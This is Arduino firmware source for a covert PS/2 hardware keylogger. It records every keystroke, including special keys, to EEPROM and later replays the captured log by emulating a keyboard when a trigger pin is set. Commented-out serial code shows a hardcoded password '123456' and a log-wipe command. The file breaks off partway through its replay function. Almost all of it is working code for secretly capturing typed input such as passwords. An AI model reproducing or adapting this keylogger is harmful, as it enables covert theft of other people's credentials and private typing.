 
 
 // SAHER BLUE EAGLE

#include <EEPROM.h>

#include <SPI.h>

#include <PS2Keyboard.h> // https://playground.arduino.cc/Main/PS2Keyboard
#include <ps2dev.h>
#include <SD.h>
const int DataPin = 3; //data green in my ps2 keyboard 

const int IRQpin =  2;   //clk gray in my ps2 keyboard
String pass,format;
String incoming = ""; 
String mystring = "";
int isdone = 0;
int iformat = 0;
int isWROTE = 0;
int iscapson = 0;
String Logxx = "LOG : ";
//const int chipSele myFile; 
int i = 0;
int  j = 0 ;
PS2Keyboard keyboard;
PS2dev  keyboardwriter(IRQpin,DataPin);  //clock, data
 
void setup()
{
keyboardwriter.keyboard_init();
   pinMode(9, INPUT);
     
  digitalWrite(9,LOW);  
 
  // Serial.begin(9600);
      pass =  String("123456");
      format = String("format");
        for (int x = 0 ; x < EEPROM.length() ; x++){
               if ( EEPROM.read(x)==0){//-1
                i = x;
                break;
               }
                 if ( EEPROM.read(x) =='0'){//-1
                i = x;
                break;
               }
               }
  
  keyboard.begin(DataPin, IRQpin);      
                                          
}

void loop()
{         incoming = "";
      /* if (Serial.available() > 0) {
                incoming = Serial.readString();
                Serial.print("Password");
                  Serial.println();

  if(format == incoming){
               Serial.println(incoming);
               Logxx = "Formatted : ";
         for (int x = 0 ; x < EEPROM.length() ; x++){
               char cc =  EEPROM.read(x);
               EEPROM.update(x, '0');//-1
               Logxx += cc;
               isdone = 1;
               }
      Serial.print("Format Done");
      Serial.println();
       Serial.print(Logxx);
      }else if(pass == incoming ){
            for (int x = 0 ; x < EEPROM.length() ; x++){
               char cc =  EEPROM.read(x);
              
               Logxx += cc;
               isdone = 1;
               }

                  
                   if (isdone > 0){
                 if (isWROTE > 0){
    
                  }else{
                          Serial.println();
                    Serial.print(Logxx);
                          Serial.println();
                    isWROTE = 1;
                 }
  
                   }
      }else{
          Serial.print("Wrong Password");
    for (int x = 0 ; x < EEPROM.length() ; x++){
               char cc =  EEPROM.read(x);
              
               Logxx += cc;
             
               }
                    Serial.println();
                    Serial.print(Logxx);
                          Serial.println();
      }
      
 


            
          
                   
           } 
       */
        
           
  

 if(keyboard.available())
  {
    
    char c = keyboard.read();
    
   // uint8_t  dat =  keyboard.readbte();

switch (c) {
  case PS2_ENTER:
    if (i < EEPROM.length()){
    
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'E');
             i++;
              EEPROM.update(i, 'N');
               i++;
                EEPROM.update(i, 'T');
                 i++;
                  EEPROM.update(i, 'R');
                   i++;
                    EEPROM.update(i, ']');
                     i++;
     
        }
    break;
  case PS2_BACKSPACE | PS2_DELETE:
 

            if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'B');
             i++;
              EEPROM.update(i, 'A');
               i++;
                EEPROM.update(i, 'C');
                 i++;
                  EEPROM.update(i, 'K');
                 i++;
                    EEPROM.update(i, 'S');
                 i++;
                    EEPROM.update(i, 'P');
                 i++;
                    EEPROM.update(i, 'A');
                 i++;
                    EEPROM.update(i, 'C');
                 i++;
                    EEPROM.update(i, 'E');
                 i++;
                    EEPROM.update(i, ']');
                     i++;
     
        } 
    break;
    case PS2_TAB:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'T');
             i++;
              EEPROM.update(i, 'A');
               i++;
                EEPROM.update(i, 'B');
                 i++;
                    EEPROM.update(i, ']');
                     i++;
       
        } 
        break;

case PS2_UPARROW:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'U');
             i++;
              EEPROM.update(i, 'P');
               i++;
                    EEPROM.update(i, ']');
                     i++;
       
        } 
        break;
 case PS2_DOWNARROW:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'D');
             i++;
              EEPROM.update(i, 'W');
               i++;
                    EEPROM.update(i, 'N');
                     i++;
                      EEPROM.update(i, ']');
                     i++;
       
        } 
  break;
   case PS2_RIGHTARROW:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'R');
             i++;
              EEPROM.update(i, 'G');
               i++;
                    EEPROM.update(i, 'H');
                     i++;
                      EEPROM.update(i, 'T');
                     i++;

          EEPROM.update(i, ']');
                     i++;
       
        } 
  break;
 case PS2_LEFTARROW:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'L');
             i++;
              EEPROM.update(i, 'E');
               i++;
                    EEPROM.update(i, 'F');
                     i++;
                      EEPROM.update(i, 'T');
                     i++;

          EEPROM.update(i, ']');
                     i++;
       
        } 
  break;

  default:
   
     if (i < EEPROM.length()){
    EEPROM.update(i, c);
    i++;
    } 
    
}
}else{
  checkforuser();  
}
  
   // while(!(myFile = SD.open("new.txt", FILE_WRITE))); 
  //  myFile.print(c);
  //  myFile.close();
  
  }
void checkforuser(){
   int caniwrite = digitalRead(9);

    
                  if (caniwrite == HIGH  ) {
            
                 
              //Serial.println("PRESSED");
                if (isdone == 0){
                     delay (100);  
                     if (caniwrite == HIGH ) {
                      delay (50);
                        if (caniwrite == LOW) {return;}
                        showlogss();
                        isdone = isdone +1 ;
                      
                      }
                
              
                  }// isdone =0  check 
        
              digitalWrite(9,LOW);  
           
                
          }
             
}
  void writeiformat(){
                 if (digitalRead(9) == LOW  ) {
                    delay(50);
                   if (digitalRead(9)  == LOW) {  isdone =0 ; digitalWrite(9,LOW);   return; }
                  }
keyboardwriter.keyboard_press(PS2dev::ENTER); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::ENTER); delay (1);
keyboardwriter.keyboard_press(PS2dev::OPEN_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::OPEN_BRACKET); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::F); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::F); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::O); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::O); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::R); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::R); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::M); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::M); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::A); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::A); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::T); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::T); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::SPACE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::SPACE); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::O); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::O); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::K); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::K); delay (1);

keyboardwriter.keyboard_press(PS2dev::CLOSE_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::CLOSE_BRACKET); delay (1);
keyboardwriter.keyboard_press(PS2dev::ENTER); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::ENTER); delay (1);
keyboardwriter.keyboard_press(PS2dev::SIX); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::SIX); delay (1);
keyboardwriter.keyboard_press(PS2dev::ZERO); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::ZERO); delay (1);
keyboardwriter.keyboard_press(PS2dev::ZERO); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::ZERO); delay (1);
keyboardwriter.keyboard_press(PS2dev::SPACE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::SPACE); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::C); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::C); delay (1);
keyboardwriter.keyboard_press(PS2dev::H); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::H); delay (1);
keyboardwriter.keyboard_press(PS2dev::A); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::A); delay (1);
keyboardwriter.keyboard_press(PS2dev::R); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::R); delay (1);
keyboardwriter.keyboard_press(PS2dev::S); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::S); delay (1);
keyboardwriter.keyboard_press(PS2dev::SPACE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::SPACE); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::O); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::O); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::K); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::K); delay (1);
keyboardwriter.keyboard_press(PS2dev::SPACE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::SPACE); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::K); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::K); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::E); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::E); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::E); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::E); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::P); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::P); delay (1);
keyboardwriter.keyboard_press(PS2dev::SPACE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::SPACE); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::I); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::I); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::N); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::N); delay (1);
keyboardwriter.keyboard_press(PS2dev::SPACE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::SPACE); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::S); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::S); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::A); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::A); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::F); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::F); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::E); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::E); delay (1);
keyboardwriter.keyboard_press(PS2dev::SPACE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::SPACE); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::P); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::P); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::L); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::L); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::A); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::A); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::C); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::C); delay (1);
keyboardwriter.keyboard_press_special(PS2dev::E); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::E); delay (1);
}
void writeupperqoute1(){
  keyboardwriter.keyboard_press(PS2dev::OPEN_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::OPEN_BRACKET); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::U); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::U); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::P); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::P); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::Q); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::Q); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::U); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::U); delay (1);
   keyboardwriter.keyboard_press_special(PS2dev::O); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::O); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::T); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::T); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::E); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::E); delay (1);
   keyboardwriter.keyboard_press_special(PS2dev::ASTERISK); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::ASTERISK); delay (1);
 
  keyboardwriter.keyboard_press(PS2dev::CLOSE_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::CLOSE_BRACKET); delay (1);
}
void writeupperqoute2(){
    keyboardwriter.keyboard_press(PS2dev::OPEN_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::OPEN_BRACKET); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::U); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::U); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::P); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::P); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::Q); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::Q); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::U); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::U); delay (1);
   keyboardwriter.keyboard_press_special(PS2dev::O); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::O); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::T); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::T); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::E); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::E); delay (1);
   keyboardwriter.keyboard_press_special(PS2dev::TWO); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::TWO); delay (1);
 
  keyboardwriter.keyboard_press(PS2dev::CLOSE_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::CLOSE_BRACKET); delay (1);

}
void writeupperqoute3(){
    keyboardwriter.keyboard_press(PS2dev::OPEN_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::OPEN_BRACKET); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::D); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::D); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::O); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::O); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::U); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::U); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::B); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::B); delay (1);
   keyboardwriter.keyboard_press_special(PS2dev::Q); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::Q); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::U); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::U); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::T); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::T); delay (1);
   keyboardwriter.keyboard_press_special(PS2dev::E); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::E); delay (1);
 
  keyboardwriter.keyboard_press(PS2dev::CLOSE_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::CLOSE_BRACKET); delay (1);

}
void writeupperqoute4(){
    keyboardwriter.keyboard_press(PS2dev::OPEN_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::OPEN_BRACKET); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::THREE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::THREE); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::A); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::A); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::S); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::S); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::F); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::F); delay (1);
   keyboardwriter.keyboard_press_special(PS2dev::O); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::O); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::R); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::R); delay (1);
  keyboardwriter.keyboard_press_special(PS2dev::A); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::A); delay (1);
 
  keyboardwriter.keyboard_press(PS2dev::CLOSE_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::CLOSE_BRACKET); delay (1);

}
void showlogss(){
               for (int x = 0 ; x < EEPROM.length() ; x++){
                 char cc =  EEPROM.read(x);
                    delayMicroseconds(20);
                    mystring.concat(cc);
                    delayMicroseconds(20);
           
               }//1st for 


               
                   for (int x = 0 ; x < mystring.length() ; x++){
                    char cc = mystring.charAt(x);
                    iformat ++;
 if (cc == 'a') { keyboardwriter.keyboard_press(PS2dev::A); delay (25);keyboardwriter.keyboard_release(PS2dev::A); delay (1);}
                   else if (cc == 'b') { keyboardwriter.keyboard_press(PS2dev::B); delay (25);keyboardwriter.keyboard_release(PS2dev::B); delay (1);}
                   else if (cc == 'c') { keyboardwriter.keyboard_press(PS2dev::C); delay (25);keyboardwriter.keyboard_release(PS2dev::C); delay (1);}
                   else if (cc == 'd') { keyboardwriter.keyboard_press(PS2dev::D); delay (25);keyboardwriter.keyboard_release(PS2dev::D); delay (1);}
                   else if (cc == 'e') { keyboardwriter.keyboard_press(PS2dev::E); delay (25);keyboardwriter.keyboard_release(PS2dev::E); delay (1);}
                   else if (cc == 'f') { keyboardwriter.keyboard_press(PS2dev::F); delay (25);keyboardwriter.keyboard_release(PS2dev::F); delay (1);}
                   else if (cc == 'g') { keyboardwriter.keyboard_press(PS2dev::G); delay (25);keyboardwriter.keyboard_release(PS2dev::G); delay (1);}
                   else if (cc == 'h') { keyboardwriter.keyboard_press(PS2dev::H); delay (25);keyboardwriter.keyboard_release(PS2dev::H); delay (1);}
                   else if (cc == 'i') { keyboardwriter.keyboard_press(PS2dev::I); delay (25);keyboardwriter.keyboard_release(PS2dev::I); delay (1);}
                   else if (cc == 'j') { keyboardwriter.keyboard_press(PS2dev::J); delay (25);keyboardwriter.keyboard_release(PS2dev::J); delay (1);}
                   else if (cc == 'k') { keyboardwriter.keyboard_press(PS2dev::K); delay (25);keyboardwriter.keyboard_release(PS2dev::K); delay (1);}
                   else if (cc == 'l') { keyboardwriter.keyboard_press(PS2dev::L); delay (25);keyboardwriter.keyboard_release(PS2dev::L); delay (1);}
                   else if (cc == 'm') { keyboardwriter.keyboard_press(PS2dev::M); delay (25);keyboardwriter.keyboard_release(PS2dev::M); delay (1);}
                   else if (cc == 'n') { keyboardwriter.keyboard_press(PS2dev::N); delay (25);keyboardwriter.keyboard_release(PS2dev::N); delay (1);}
                   else if (cc == 'o') { keyboardwriter.keyboard_press(PS2dev::O); delay (25);keyboardwriter.keyboard_release(PS2dev::O); delay (1);}
                   else if (cc == 'p') { keyboardwriter.keyboard_press(PS2dev::P); delay (25);keyboardwriter.keyboard_release(PS2dev::P); delay (1);}
                   else if (cc == 'q') { keyboardwriter.keyboard_press(PS2dev::Q); delay (25);keyboardwriter.keyboard_release(PS2dev::Q); delay (1);}
                   else if (cc == 'r') { keyboardwriter.keyboard_press(PS2dev::R); delay (25);keyboardwriter.keyboard_release(PS2dev::R); delay (1);}
                   else if (cc == 's') { keyboardwriter.keyboard_press(PS2dev::S); delay (25);keyboardwriter.keyboard_release(PS2dev::S); delay (1);}
                   else if (cc == 't') { keyboardwriter.keyboard_press(PS2dev::T); delay (25);keyboardwriter.keyboard_release(PS2dev::T); delay (1);}
                   else if (cc == 'u') { keyboardwriter.keyboard_press(PS2dev::U); delay (25);keyboardwriter.keyboard_release(PS2dev::U); delay (1);}
                   else if (cc == 'v') { keyboardwriter.keyboard_press(PS2dev::V); delay (25);keyboardwriter.keyboard_release(PS2dev::V); delay (1);}
                   else if (cc == 'w') { keyboardwriter.keyboard_press(PS2dev::W); delay (25);keyboardwriter.keyboard_release(PS2dev::W); delay (1);}
                   else if (cc == 'x') { keyboardwriter.keyboard_press(PS2dev::X); delay (25);keyboardwriter.keyboard_release(PS2dev::X); delay (1);}
                   else if (cc == 'y') { keyboardwriter.keyboard_press(PS2dev::Y); delay (25);keyboardwriter.keyboard_release(PS2dev::Y); delay (1);}
                   else if (cc == 'z') { keyboardwriter.keyboard_press(PS2dev::Z); delay (25);keyboardwriter.keyboard_release(PS2dev::Z); delay (1);}
  if (cc == 'A') { keyboardwriter.keyboard_press_special(PS2dev::A); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::A); delay (1);}
                   else if (cc == 'B') { keyboardwriter.keyboard_press_special(PS2dev::B); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::B); delay (1);}
                   else if (cc == 'C') { keyboardwriter.keyboard_press_special(PS2dev::C); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::C); delay (1);}
                   else if (cc == 'D') { keyboardwriter.keyboard_press_special(PS2dev::D); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::D); delay (1);}
                   else if (cc == 'E') { keyboardwriter.keyboard_press_special(PS2dev::E); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::E); delay (1);}
                   else if (cc == 'F') { keyboardwriter.keyboard_press_special(PS2dev::F); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::F); delay (1);}
                   else if (cc == 'G') { keyboardwriter.keyboard_press_special(PS2dev::G); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::G); delay (1);}
                   else if (cc == 'H') { keyboardwriter.keyboard_press_special(PS2dev::H); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::H); delay (1);}
                   else if (cc == 'I') { keyboardwriter.keyboard_press_special(PS2dev::I); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::I); delay (1);}
                   else if (cc == 'J') { keyboardwriter.keyboard_press_special(PS2dev::J); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::J); delay (1);}
                   else if (cc == 'K') { keyboardwriter.keyboard_press_special(PS2dev::K); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::K); delay (1);}
                   else if (cc == 'L') { keyboardwriter.keyboard_press_special(PS2dev::L); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::L); delay (1);}
                   else if (cc == 'M') { keyboardwriter.keyboard_press_special(PS2dev::M); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::M); delay (1);}
                   else if (cc == 'N') { keyboardwriter.keyboard_press_special(PS2dev::N); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::N); delay (1);}
                   else if (cc == 'O') { keyboardwriter.keyboard_press_special(PS2dev::O); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::O); delay (1);}
                   else if (cc == 'P') { keyboardwriter.keyboard_press_special(PS2dev::P); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::P); delay (1);}
                   else if (cc == 'Q') { keyboardwriter.keyboard_press_special(PS2dev::Q); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::Q); delay (1);}
                   else if (cc == 'R') { keyboardwriter.keyboard_press_special(PS2dev::R); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::R); delay (1);}
                   else if (cc == 'S') { keyboardwriter.keyboard_press_special(PS2dev::S); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::S); delay (1);}
                   else if (cc == 'T') { keyboardwriter.keyboard_press_special(PS2dev::T); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::T); delay (1);}
                   else if (cc == 'U') { keyboardwriter.keyboard_press_special(PS2dev::U); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::U); delay (1);}
                   else if (cc == 'V') { keyboardwriter.keyboard_press_special(PS2dev::V); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::V); delay (1);}
